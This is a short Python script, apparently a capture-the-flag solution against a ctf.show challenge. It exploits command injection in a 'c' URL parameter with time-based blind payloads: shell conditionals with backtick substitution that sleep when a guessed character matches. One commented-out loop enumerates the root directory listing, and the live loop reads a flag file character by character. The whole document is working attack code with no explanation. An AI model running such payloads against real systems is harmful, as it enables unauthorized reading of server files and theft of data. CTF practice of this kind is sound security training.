# import requests
# url="http://ef57ec7e-56cc-48d0-8463-7a4ab6cb64e7.challenge.ctf.show/?c="
# payload="if [ `ls / -1 |cut -c {} | awk \"NR=={}\"`  ==  \"{}\" ];then sleep 4;fi"

# result=""
# row=7
# length=15
# strings = "abcdefghijklmnopqrstuvwxyz_-0123456789"
# for r in range(1,row):
#     for c in range(1,length):
#         for s in strings:
#             target = url+payload.format(c,r,s) ##format格式化
            
#             try:
#                 requests.get(target,timeout=3)
#             except:
#                 result += s
#                 print(result)
#                 break
#         result += " "
# print(result)

import requests
url="http://ef57ec7e-56cc-48d0-8463-7a4ab6cb64e7.challenge.ctf.show/?c="
payload="if [ `cat /f149_15_h3r3 |cut -c {} `  ==  \"{}\" ];then sleep 4;fi"

result=""
row=7
length=48
strings = "abcdefghijklmnopqrstuvwxyz_-0123456789"
for c in range(1,length):
        for s in strings:
            target = url+payload.format(c,s)
            try:
                requests.get(target,timeout=3)
            except:
                result += s
                print(result)
                break
        
print(result)










